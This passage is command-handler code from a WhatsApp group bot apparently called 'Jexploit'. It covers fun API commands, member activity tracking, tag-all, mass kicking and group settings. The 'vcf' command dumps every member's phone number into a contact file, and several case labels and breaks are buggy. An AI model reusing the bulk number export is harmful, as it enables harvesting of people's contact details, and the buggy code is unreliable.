        return reply(`*🖼️ REMOVE BACKGROUND*\n\nReply to an image with this command to remove its background.\n\n*Usage:*\n${prefix}removebg (reply to an image)\n${prefix}rmbg (reply to an image)\n\n*Example:* Reply to an image with .removebg`);
    }

    await reply(`🖼️ *Processing image...*\n\n⏳ Removing background, please wait...`);
    await conn.sendMessage(m.chat, { react: { text: "🎨", key: m.key } });

    try {
        // Upload image to catbox
        const imageUrl = await handleMediaUpload(quoted, conn, mime);
        
        if (!imageUrl || imageUrl.includes('exceeds the limit')) {
            return reply(`*Failed to upload image!*\n\nPlease try again with a smaller image.`);
        }

        const apiUrl = `https://api.nexray.eu.cc/tools/removebg?url=${encodeURIComponent(imageUrl)}`;
        const response = await axios.get(apiUrl, {
            responseType: 'arraybuffer',
            timeout: 30000
        });

        const contentType = response.headers['content-type'];
        
        if (contentType && contentType.includes('image')) {
            await conn.sendMessage(m.chat, {
                image: Buffer.from(response.data),
                caption: `✅ *Background removed successfully!*`
            }, { quoted: m });
            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        } else {
            throw new Error('Invalid response from API');
        }

    } catch (error) {
        console.error('RemoveBG error:', error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        reply(`*Failed to remove background!*\n\nPlease try again with a different image.`);
    }
   
}
break
case 'joke': {
    try {
        const apiUrl = `https://api.princetechn.com/api/fun/jokes?apikey=${global.princetechn || 'prince'}`;
        const { data } = await axios.get(apiUrl, { timeout: 10000 });
        
        if (data && data.success && data.result) {
            const joke = data.result;
            const jokeText = `${joke.setup}\n\n${joke.punchline}`;
            await conn.sendMessage(from, { text: jokeText }, { quoted: m });
        } else {
            await conn.sendMessage(from, { text: "Couldn't fetch a joke. Please try again!" }, { quoted: m });
        }
    } catch (error) {
        console.error('Joke error:', error.message);
        await conn.sendMessage(from, { text: "Error fetching joke. Try again later!" }, { quoted: m });
    }
    
}
break
case "valentines": {
    try {
            const axios = require('axios');
            const apiUrl = `https://api.princetechn.com/api/fun/valentines?apikey=prince`;
            const response = await axios.get(apiUrl);
            
            if (response.data?.success && response.data?.result) {
                reply(response.data.result);
            } else {
                reply('Failed to fetch valentine message.');
            }
        } catch (error) {
            console.error('Valentine error:', error);
            reply('Error fetching valentine message.');
        }
}
break
case "pickupline": {
try {
        // Fetch pickup line from the API
        const res = await fetch('https://api.popcat.xyz/pickuplines');
        
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }

        const json = await res.json();
        console.log('JSON response:', json);

        // Format the pickup line message
        const pickupLine = `*Here's a pickup line for you:*\n\n"${json.pickupline}"\n\n> *© ᴅʀᴏᴘᴘᴇᴅ ʙʏ ${global.botname}*`;

        // Send the pickup line to the chat
        await conn.sendMessage(from, { text: pickupLine }, { quoted: m });

    } catch (error) {
        console.error("Error in pickupline command:", error);
        reply("Sorry, something went wrong while fetching the pickup line. Please try again later.");
    }
}
break
case "trivia": {
try {
      let res = await fetch("https://opentdb.com/api.php?amount=1");
      let json = await res.json();

      let question = json.results[0].question;
      let answer = json.results[0].correct_answer;

      await conn.sendMessage(m.chat, { text: `Question: ${question}\n\nThink you know the answer? Sending the correct answer after 20 seconds` }, { quoted: m });
      
      setTimeout(async () => {
        await conn.sendMessage(m.chat, { text: `Answer: ${answer}` });
      }, 20000); // 20 seconds
    } catch (error) {
      console.error('Error fetching trivia question:', error);
      reply('An error occurred while fetching the trivia question.');
    }
}
case "riddle": {
try {
            await reply("🧩 *Loading riddle...*");
            
            const response = await fetch(`${global.mess.siputzx}/api/games/tekadek`);
            const data = await response.json();
            
            if (!data.status || !data.data) {
                return reply("Failed to fetch riddle. Try again later.");
            }
            
            const { soal, jawaban } = data.data;
            
            let message = `*🧩 TEKA-TEKI / RIDDLE*\n\n`;
            message += `❓ *Question:*\n${soal}\n\n`;
            message += `💡 *Answer:* ||${jawaban}||\n\n`;
            message += `_Reply with .riddle to get another riddle_`;
            
            reply(message);
            
        } catch (error) {
            console.error('Riddle error:', error);
            reply("Error fetching riddle. Try again later.");
        }
}
break
case "advice": {
    try {
       const apiUrl = `https://api.princetechn.com/api/fun/advice?apikey=prince`;
            const response = await axios.get(apiUrl);
            
            if (response.data?.success && response.data?.result) {
                reply(response.data.result);
            } else {
                reply('Failed to fetch advice.');
            }
        } catch (error) {
            console.error('Advice error:', error);
            reply('Error fetching advice.');
        }
}
break
case "motivate": {
try {
    const apiUrl = `https://api.princetechn.com/api/fun/motivation?apikey=prince`;
            const response = await axios.get(apiUrl);
            
            if (response.data?.success && response.data?.result) {
                reply(response.data.result);
            } else {
                reply('Failed to fetch motivation message.');
            }
        } catch (error) {
            console.error('Motivation error:', error);
            reply('Error fetching motivation message.');
        }
}
break
case "character": {
try {
        // Ensure the command is used in a group
        if (!isGroup) {
            return reply("This command can only be used in groups.");
        }

        // Extract the mentioned user
        const mentionedUser = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedUser) {
            return reply("Please mention a user whose character you want to check.");
        }

        // Define character traits
        const userChar = [
            "Sigma",
            "Generous",
            "Grumpy",
            "Overconfident",
            "Obedient",
            "Good",
            "Simp",
            "Kind",
            "Patient",
            "Pervert",
            "Cool",
            "Helpful",
            "Brilliant",
            "Sexy",
            "Single",
            "Hot",
            "Gorgeous",
            "Cute",
        ];

        // Randomly select a character trait
        const userCharacterSelection =
            userChar[Math.floor(Math.random() * userChar.length)];

        // Message to send
        const message = `Character of @${mentionedUser.split("@")[0]} is *${userCharacterSelection}* 🔥⚡`;

        // Send the message with mentions
        await conn.sendMessage(from, {
            text: message,
            mentions: [mentionedUser],
        }, { quoted: m });

    } catch (e) {
        console.error("Error in character command:", e);
        reply("An error occurred while processing the command. Please try again.");
    }
}
//=====[GROUP MENU CMDS]======
break 
case "hidetag": case "h": {
if (!m.isGroup) return reply(mess.group)
if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);

let members = groupMembers.map(a => a.id)
conn.sendMessage(m.chat, {text : q ? q : 'Jexploit Is Always Here', mentions: members}, {quoted:m})
}
break
case 'listactive':
case 'activeusers': {
    if (!m.isGroup) return reply(mess.group);
    
     const activeUsers = await GroupDB.getActiveUsers(from, 15);
        
        if (!activeUsers.length) {
            return reply('*📊 No active users found in this group.*\n\nSend some messages first to track activity!');
        }
        
        let message = `📊 *ACTIVE USERS - ${groupName || 'This Group'}*\n\n`;
        
        activeUsers.forEach((user, index) => {
            const medal = index === 0 ? '🥇' : index === 1 ? '🥈' : index === 2 ? '🥉' : '🔹';
            message += `${medal} ${index + 1}. @${user.jid.split('@')[0]} - *${user.count} messages*\n`;
        });
        
        message += `\n📈 *Total tracked users:* ${activeUsers.length}`;
        
        await conn.sendMessage(m.chat, { 
            text: message, 
            mentions: activeUsers.map(u => u.jid) 
        }, { quoted: m });
}
break
case 'listinactive':
case 'inactiveusers': {
    if (!m.isGroup) return reply(mess.group);
    
    try {
        const metadata = await conn.groupMetadata(from);
        const allParticipants = metadata.participants.map(p => p.id);
        
        const inactiveUsers = await GroupDB.getInactiveUsers(from, allParticipants);
        
        if (!inactiveUsers.length) {
            return reply('*✅ No inactive users found!*\n\nAll members have sent messages.');
        }
        
        let message = `⚠️ *INACTIVE USERS - ${groupName || 'This Group'}*\n\n`;
        message += `_Users who haven't sent any messages:_\n\n`;
        message += inactiveUsers.map((user, i) => `🔹 ${i + 1}. @${user.split('@')[0]}`).join('\n');
        message += `\n\n📊 *Total inactive:* ${inactiveUsers.length}`;

        await conn.sendMessage(m.chat, { 
            text: message, 
            mentions: inactiveUsers 
        }, { quoted: m });
        
    } catch (error) {
        console.error('Error in listinactive command:', error);
        reply('*Error fetching group data!*');
    }
    break;
}
break
case 'groupactivity':
case 'activity': {
    if (!m.isGroup) return reply(mess.group);
    
    try {
        const metadata = await conn.groupMetadata(from);
        const allParticipants = metadata.participants.map(p => p.id);
        const activeUsers = await GroupDB.getActiveUsers(from, 1000); // Get all active users
        const inactiveUsers = await GroupDB.getInactiveUsers(from, allParticipants);
        
        let message = `📊 *GROUP ACTIVITY - ${groupName || 'This Group'}*\n\n`;
        message += `*Total Members:* ${allParticipants.length}\n`;
        message += `✅ *Active Users:* ${activeUsers.length}\n`;
        message += `*Inactive Users:* ${inactiveUsers.length}\n\n`;
        
        if (activeUsers.length > 0) {
            message += `🏆 *Top 3 Active Users:*\n`;
            activeUsers.slice(0, 3).forEach((user, index) => {
                const medals = ['🥇', '🥈', '🥉'];
                message += `${medals[index]} @${user.jid.split('@')[0]} - *${user.count} messages*\n`;
            });
            message += `\n`;
        }
        
        if (inactiveUsers.length > 0) {
            message += `💤 *Inactive Users (${inactiveUsers.length}):*\n`;
            inactiveUsers.slice(0, 5).forEach((user, index) => {
                message += `${index + 1}. @${user.split('@')[0]}\n`;
            });
            if (inactiveUsers.length > 5) {
                message += `... and ${inactiveUsers.length - 5} more`;
            }
        }

        const mentions = [
            ...activeUsers.slice(0, 3).map(u => u.jid),
            ...inactiveUsers.slice(0, 5)
        ];
        
        await conn.sendMessage(m.chat, { 
            text: message, 
            mentions: mentions 
        }, { quoted: m });
        
    } catch (error) {
        console.error('Error in groupactivity command:', error);
        await reply('❌ *Error fetching group activity!*');
    }
    
}
break
case 'kickinactive':
case 'removeinactive': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);

    try {
        const metadata = await conn.groupMetadata(from);
        const allParticipants = metadata.participants.map(p => p.id);
        const groupAdmins = metadata.participants.filter(p => p.admin).map(p => p.id);
        
        const inactiveUsers = getInactiveUsers(from, allParticipants)
            .filter(user => !groupAdmins.includes(user)); // Exclude admins

        if (!inactiveUsers.length) {
            return reply('*✅ No inactive users found to kick!*\n\nAll participants have sent messages or are admins.');
        }

        let message = `🚨 *KICKING INACTIVE USERS - ${metadata.subject || 'This Group'}*\n\n`;
        message += `_The following users will be kicked in 25 seconds:_\n\n`;
        message += inactiveUsers.map((user, i) => `🔹 ${i + 1}. @${user.split('@')[0]}`).join('\n');
        message += `\n\n📊 *Total to kick:* ${inactiveUsers.length}`;
        message += `\n⏰ *Time:* 25 seconds`;
        message += `\n❌ *Cancel:* Use *${prefix}cancelkick* to stop`;

        await conn.sendMessage(m.chat, { 
            text: message, 
            mentions: inactiveUsers 
        }, { quoted: m });

        // Store in kick queue
        if (!global.kickQueue) global.kickQueue = new Map();
        global.kickQueue.set(m.chat, { 
            type: 'inactive', 
            users: inactiveUsers,
            timestamp: Date.now()
        });

        // Auto kick after 25 seconds
        setTimeout(async () => {
            if (!global.kickQueue.has(m.chat)) return;
            
            const queueData = global.kickQueue.get(m.chat);
            if (queueData.type === 'inactive') {
                for (let user of inactiveUsers) {
                    try {
                        await conn.groupParticipantsUpdate(m.chat, [user], "remove");
                        // Small delay to avoid rate limiting
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    } catch (userError) {
                        console.error(`Failed to kick ${user}:`, userError);
                    }
                }
                reply('✅ *Inactive users have been kicked successfully!*');
                global.kickQueue.delete(m.chat);
            }
        }, 25000);

    } catch (error) {
        console.error('Error in kickinactive command:', error);
        await reply('❌ *Error processing kick command!*');
    }
    break;
}
case 'cancelkick': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);

    try {
        if (global.kickQueue && global.kickQueue.has(m.chat)) {
            const queueData = global.kickQueue.get(m.chat);
            const usersCount = queueData.users ? queueData.users.length : 0;
            const kickType = queueData.type === 'inactive' ? 'Inactive Users Kick' : 
                            queueData.type === 'all' ? 'Kick All Members' : 'Unknown Kick';
            
            global.kickQueue.delete(m.chat);
            
            let cancelMessage = `❌ *KICK OPERATION CANCELLED!*\n\n`;
            cancelMessage += `📋 *Type:* ${kickType}\n`;
            cancelMessage += `👥 *Users affected:* ${usersCount}\n`;
            cancelMessage += `⏰ *Cancelled by:* @${m.sender.split('@')[0]}\n`;
            cancelMessage += `✅ *Status:* Successfully cancelled`;
            
            await conn.sendMessage(m.chat, { 
                text: cancelMessage, 
                mentions: [m.sender]
            });
            
        } else {
            reply('❌ *No kick operation in progress!*\n\nThere is no active kick process to cancel.');
        }
    } catch (error) {
        console.error('Error in cancelkick command:', error);
        await reply('❌ *Error cancelling kick operation!*');
    }
    break;
}
case 'kickall':
case 'removeall': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);

    try {
        const metadata = await conn.groupMetadata(from);
        const allParticipants = metadata.participants.map(p => p.id);
        const groupAdmins = metadata.participants.filter(p => p.admin).map(p => p.id);
        
        // Get all non-admin members (users to kick)
        const usersToKick = allParticipants.filter(user => !groupAdmins.includes(user));

        if (!usersToKick.length) {
            return reply('*✅ No members to kick!*\n\nOnly admins are in this group.');
        }

        let message = `🚨 *KICKING ALL MEMBERS - ${metadata.subject || 'This Group'}*\n\n`;
        message += `_All non-admin members will be removed in 25 seconds:_\n\n`;
        message += usersToKick.map((user, i) => `🔹 ${i + 1}. @${user.split('@')[0]}`).join('\n');
        message += `\n\n📊 *Total to kick:* ${usersToKick.length}`;
        message += `\n*Admins protected:* ${groupAdmins.length}`;
        message += `\n*Time:* 25 seconds`;
        message += `\n*Cancel:* Use *${prefix}cancelkick* to stop`;

        await conn.sendMessage(m.chat, { 
            text: message, 
            mentions: usersToKick 
        }, { quoted: m });

        // Store in kick queue
        if (!global.kickQueue) global.kickQueue = new Map();
        global.kickQueue.set(m.chat, { 
            type: 'all', 
            users: usersToKick,
            timestamp: Date.now()
        });

        // Auto kick after 25 seconds
        setTimeout(async () => {
            if (!global.kickQueue.has(m.chat)) return;
            
            const queueData = global.kickQueue.get(m.chat);
            if (queueData.type === 'all') {
                let successCount = 0;
                let failCount = 0;
                
                for (let user of usersToKick) {
                    try {
                        await conn.groupParticipantsUpdate(m.chat, [user], "remove");
                        successCount++;
                        // Small delay to avoid rate limiting
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    } catch (userError) {
                        console.error(`Failed to kick ${user}:`, userError);
                        failCount++;
                    }
                }
                
                let resultMessage = `✅ *Kick All Operation Completed!*\n\n`;
                resultMessage += `✓ Successfully kicked: ${successCount}\n`;
                if (failCount > 0) {
                    resultMessage += `✗ Failed to kick: ${failCount}\n`;
                }
                resultMessage += `🛡️ Admins remaining: ${groupAdmins.length}`;
                
                reply(resultMessage);
                global.kickQueue.delete(m.chat);
            }
        }, 25000);

    } catch (error) {
        console.error('Error in kickall command:', error);
        await reply('❌ *Error processing kick all command!*');
    }
    break;
}
case "tagall": {
    if (!m.isGroup) return reply(mess.group);
   if (!m.isAdmin) return reply(mess.notadmin);
   if (!m.isBotAdmin) return reply(mess.botadmin);

    let me = m.sender;
    let q = m.text.split(' ').slice(1).join(' ').trim(); // Extract the message after the command
    let teks = `*TAGGED BY:* @${me.split("@")[0]}\n\n*MESSAGE:* ${q || "No message"}\n\n`;
    
    for (let mem of participants) {
        teks += `@${mem.id.split("@")[0]}\n`;
    }
    
    conn.sendMessage(
        m.chat,
        {
            text: teks,
            mentions: participants.map((a) => a.id),
        },
        {
            quoted: m,
        }
    );
}
break
case "togstatus": {
if (!isGroup) return reply(mess.notgroup);
            if (!m.isAdmin) return reply(mess.notadmin);
            if (!m.isBotAdmin) return reply(mess.botadmin);
        
        try {
            const messageText = m.message?.conversation || m.message?.extendedTextMessage?.text || '';
            const quotedMessage = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
            const commandRegex = /^[.!#/]?(togstatus|swgc|groupstatus|tosgroup)\s*/i;

            if (!quotedMessage && (!messageText.trim() || messageText.trim().match(commandRegex))) {
                return reply(getHelpText());
            }

            let payload = null;
            let textAfterCommand = '';

            if (messageText.trim()) {
                const match = messageText.match(commandRegex);
                if (match) textAfterCommand = messageText.slice(match[0].length).trim();
            }

            if (quotedMessage) {
                payload = await buildPayloadFromQuoted(quotedMessage, conn);
                if (textAfterCommand && payload) {
                    if (payload.video || payload.image || (payload.convertedSticker && payload.image)) {
                        payload.caption = textAfterCommand;
                    }
                }
            } else if (messageText.trim()) {
                if (textAfterCommand) {
                    payload = { text: textAfterCommand };
                } else {
                    return reply(getHelpText());
                }
            }

            if (!payload) {
                return reply(getHelpText());
            }

            // Send group status
            await sendGroupStatus(conn, m.chat, payload);

            const mediaType = detectMediaType(quotedMessage, payload);
            let successMsg = `✅ ${mediaType} sent!`;
            if (payload.caption) successMsg += `\n📝 "${payload.caption}"`;
            if (payload.convertedSticker) successMsg += `\n(sticker → image)`;

            await reply(successMsg);

        } catch (error) {
            console.error('Error in group status command:', error);
            await reply(`Error: ${error.message}`);
        }
}
break
case "mute":
case "close": {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    try {
        await conn.groupSettingUpdate(m.chat, "announcement");
        reply("🔒 *Group closed successfully!*\n\nOnly admins can send messages now.");
    } catch (error) {
        console.error("Error muting group:", error);
        reply("❌ Failed to close the group. Make sure bot has admin permissions.");
    }
}
break;
case "delgrouppp": {
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        
        await conn.removeProfilePicture(from);
        reply("Group profile picture has been successfully removed.");
}
break
case "setdesc": {
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
        
        if (!text) return reply("*Please enter a text*");
        
        await conn.groupUpdateDescription(m.chat, text);
        reply(mess.done);
}
break
case "vcf": {
try {
        if (!isGroup) return reply("This command is for groups only.");
        if (!Access) return reply("*_This command is for the owner only_*");

        let card = quoted || m; // Handle if quoted message exists
        let cmiggc = groupMetadata;
        const { participants } = groupMetadata;
        
        let orgiggc = participants.map(a => a.id);
        let vcard = '';
        let noPort = 0;
        
        for (let a of cmiggc.participants) {
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`;
        }

        let nmfilect = './contacts.vcf';
        reply('Saving ' + cmiggc.participants.length + ' participants contact');

        fs.writeFileSync(nmfilect, vcard.trim());
        await sleep(2000);

        await conn.sendMessage(from, {
            document: fs.readFileSync(nmfilect), 
            mimetype: 'text/vcard', 
            fileName: 'jexploit.vcf', 
            caption: `\nDone saving.\nGroup Name: *${cmiggc.subject}*\nContacts: *${cmiggc.participants.length}*\n> Powered by ${global.botname} `}, { quoted: mek });

        fs.unlinkSync(nmfilect); // Cleanup the file after sending
    } catch (err) {
        reply(err.toString());
    }
}
break
case 'approve': {
if (!m.isGroup) return reply(mess.group)
if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);

const responseList = await conn.groupRequestParticipantsList(m.chat);

if (responseList.length === 0) return reply("*No pending requests detected at the moment!*");

for (const participan of responseList) {
    const response = await conn.groupRequestParticipantsUpdate(
        m.chat, 
        [participan.jid], // Approve/reject each participant individually
        "approve" // or "reject"
    );
    console.log(response);
}
reply(`*${global.botname} has approved all pending requests✅*`);

}
break
case "listrequest":
case "listreq":
case "pending": {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    const groupId = m.chat;
    await listGroupRequests(conn, m, groupId);
}
break
case "approveall":
case "acceptall":
case "approve-all": {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    const groupId = m.chat;
    await approveAllRequests(conn, m, groupId);
}
break

case "disapproveall":
case "rejectall":
case "declineall":
case "disapprove-all": {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    const groupId = m.chat;
    await disapproveAllRequests(conn, m, groupId);
}
break
case "mediatag": {
        if (!m.isGroup) return reply(mess.group);
  
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        
        if (!m.quoted) return reply(`Reply to any media with caption ${prefix + command}`);

        conn.sendMessage(m.chat, {
          forward: m.quoted.fakeObj,
          mentions: participants.map((a) => a.id),
        });
}
break
case "promote":
case "upgrade": {
if (!Access) return reply(mess.owner);
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
       
    let target = m.mentionedJid[0] 
      ? m.mentionedJid[0] 
      : m.quoted 
      ? m.quoted.sender 
      : text.replace(/\D/g, "") 
      ? text.replace(/\D/g, "") + "@s.whatsapp.net" 
      : null;

    if (!target) return reply("⚠ *Mention or reply to a user to promote!*");

    try {
      await conn.groupParticipantsUpdate(m.chat, [target], "promote");
      reply(`✅ *User promoted successfully!*`);
    } catch (error) {
      reply("❌ *Failed to promote user. They might already be an admin or the bot lacks permissions.*");
    }
  }
break
case "demote":
case "downgrade": {
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
    
    let target = m.mentionedJid[0] 
      ? m.mentionedJid[0] 
      : m.quoted 
      ? m.quoted.sender 
      : text.replace(/\D/g, "") 
      ? text.replace(/\D/g, "") + "@s.whatsapp.net" 
      : null;

    if (!target) return reply("⚠ *Mention or reply to a user to demote!*");

    try {
      await conn.groupParticipantsUpdate(m.chat, [target], "demote");
      reply(`✅ *User demoted successfully!*`);
    } catch (error) {
      reply("❌ *Failed to demote user. They might already be a member or the bot lacks permissions.*");
    }
}
break
case " getgrouppp": {
if (!m.isGroup) return reply(mess.group);

    try {
      const ppUrl = await conn.profilePictureUrl(m.chat, 'image');

      await conn.sendMessage(m.chat, 
        { 
          image: { url: ppUrl }, 
          caption: `🔹 *This Group's Profile Picture*`
        }, 
        { quoted: m }
      );
    } catch {
      await conn.sendMessage(m.chat, 
        { 
          image: { url: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' }, 
          caption: '⚠️ No profile picture found for this group.'
        }, 
        { quoted: m }
      );
    }
}

break
case "online":
case "listonline": {
    if (!m.isGroup) return reply(mess.group);
    
    try {
        let id = args[0] && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        
        // Safely check if presences exist
        let presences = store.presences && store.presences[id] ? store.presences[id] : null;
        
        if (!presences || Object.keys(presences).length === 0) {
            return reply('*No online members detected in this group.*');
        }

        // Safely get online members
        let onlineMembers = [];
        try {
            onlineMembers = [...Object.keys(presences), botNumber];
        } catch (e) {
            console.error('Error getting online members:', e);
            return reply('*Error detecting online members.*');
        }

        // Filter out invalid entries and ensure they're valid JIDs
        const validOnlineMembers = onlineMembers.filter(member => 
            member && typeof member === 'string' && member.includes('@')
        );

        if (validOnlineMembers.length === 0) {
            return reply('*No online members detected in this group.*');
        }

        let liston = 1;
        const onlineListText = '*ONLINE MEMBERS IN THIS GROUP*\n\n' + 
            validOnlineMembers.map(v => {
                const username = v.replace(/@.+/, '');
                return `${liston++}. @${username}`;
            }).join('\n');

        // Send message with mentions
        await conn.sendMessage(
            m.chat,
            {
                text: onlineListText,
                mentions: validOnlineMembers
            },
            { quoted: m }
        );
        
    } catch (error) {
        console.error('Error in listonline command:', error);
        reply('*An error occurred while checking online members.*');
    }
    
}
break
case "editinfo": {
       if (!m.isGroup) return reply(mess.group);

        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);

        if (args[0] === "on") {
            await conn.groupSettingUpdate(m.chat, "unlocked").then(
                (res) => reply(`*Successful, members can edit group info*`)
            );
        } else if (args[0] === "off") {
            await conn.groupSettingUpdate(m.chat, "locked").then((res) =>
                reply(`*Successful, members cannot edit group info*`)
            );
        } else {
            reply(`Example ${prefix + command} on/off`);
        }
}
break
case "invite": {
        if (!m.isGroup) return reply(mess.group);
 
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
       
        if (!text)
            return reply(
                `*Enter the number you want to invite to this group*\n\nExample :\n${prefix + command} 256742932677`
            );
        if (text.includes("+"))
            return reply(`*Enter the number together without* *+*`);
        if (isNaN(text))
            return reply(
                `*Enter only the numbers with your country code without spaces*`
            );

        let group = m.chat;
        let link = "https://chat.whatsapp.com/" + (await conn.groupInviteCode(group));
        await conn.sendMessage(text + "@s.whatsapp.net", {
            text: `*GROUP INVITATION*\n\nSomeone invites you to join this group: \n\n${link}`,
            mentions: [m.sender],
        });
        reply(`*Successfully sent invite link*`);
}
break
case "linkgc": {
if (!Access) return reply(mess.owner);
        if (!m.isGroup) return reply(mess.group);

    let response = await conn.groupInviteCode(m.chat);
    conn.sendText(
      m.chat,
      `*GROUP LINK*\n\n*NAME:* ${groupMetadata.subject}\n\n*OWNER:* ${groupMetadata.owner !== undefined ? "+" + groupMetadata.owner.split`@`[0] : "Unknown"}\n\n*ID:* ${groupMetadata.id}\n\n*LINK:* https://chat.whatsapp.com/${response}\n\n*MEMBERS:* ${groupMetadata.participants.length}`,
      m,
      {
        detectLink: true,
      }
    );
}
break
case "'unlockgc'": {
try {
        if (!isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        
        await conn.groupSettingUpdate(from, "unlocked");
        reply("🔓 Group settings are now unlocked", {
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });

    } catch (error) {
        console.error("UnlockGS Error:", error);
        reply("❌ Failed to unlock group settings");
    }
}
break
case "lockgcsettings":
case "lockgc": {
try {
        if (!isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        await conn.groupSettingUpdate(from, 'locked');
        reply("🔒 Group settings are now locked (admins only)", {
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });

    } catch (error) {
        console.error("LockGS Error:", error);
        reply("❌ Failed to lock group settings");
    }
}
break
case "unlockgcsettings":
case "unlockgc": {
    try {
       if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        await conn.groupSettingUpdate(from, 'unlocked');
        reply("🔓 Group settings are now unlocked (all participants)", {
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });

    } catch (error) {
        console.error("UnlockGS Error:", error);
        reply("❌ Failed to unlock group settings");
    }
}
break
case "adminapproval": {
    try {
       if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        // Get current group settings to check current state
        const groupMetadata = await conn.groupMetadata(from);
        
        // Toggle admin approval mode
        await conn.groupSettingUpdate(from, groupMetadata.announce ? 'not_announcement' : 'announcement');
        
        const newState = groupMetadata.announce ? "OFF" : "ON";
        reply(`✅ Admin approval mode turned ${newState}`, {
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });

    } catch (error) {
        console.error("AdminApproval Error:", error);
        reply("❌ Failed to toggle admin approval mode");
    }
}
break
case "closetime": {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    

    // Check if both arguments are provided
    if (!args[0] || !args[1]) {
        return reply("*Usage:*\n.closetime [duration] [unit]\n\n*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    }

    const duration = args[0];
    const unit = args[1].toLowerCase();

    let timer;
    switch (unit) {
        case "seconds":
            timer = duration * 1000;
            break;
        case "minutes":
            timer = duration * 60000;
            break;
        case "hours":
            timer = duration * 3600000;
            break;
        case "days":
            timer = duration * 86400000;
            break;
        default:
            return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    }

    reply(`*Closing group after ${duration} ${unit}*`);
    setTimeout(() => {
        conn.groupSettingUpdate(m.chat, "announcement");
        reply("*Group closed by admin. Only admins can send messages.*");
    }, timer);
}
break
case "opentime": {
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);

    const duration = args[0];
    if (!args[1] || typeof args[1] !== 'string') return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    const unit = args[1].toLowerCase();

    let timer;
    switch (unit) {
        case "seconds":
            timer = duration * 1000;
            break;
        case "minutes":
            timer = duration * 60000;
            break;
        case "hours":
            timer = duration * 3600000;
            break;
        case "days":
            timer = duration * 86400000;
            break;
        default:
            return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    }

    reply(`*Opening group after ${duration} ${unit}*`);
    setTimeout(() => {
        conn.groupSettingUpdate(m.chat, "not_announcement");
        reply("*Group opened by admin. Members can now send messages.*");
    }, timer);
}
break
case "totalmembers": {
if (!m.isGroup) return reply(mess.group);
   
    await conn.sendMessage(
      m.chat,
      {
        text: `*GROUP*: ${groupMetadata.subject}\n*MEMBERS*: ${participants.length}`,
      },
      { quoted: m, ephemeralExpiration: 86400 }
    );
}
break
case "mediatag": {
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
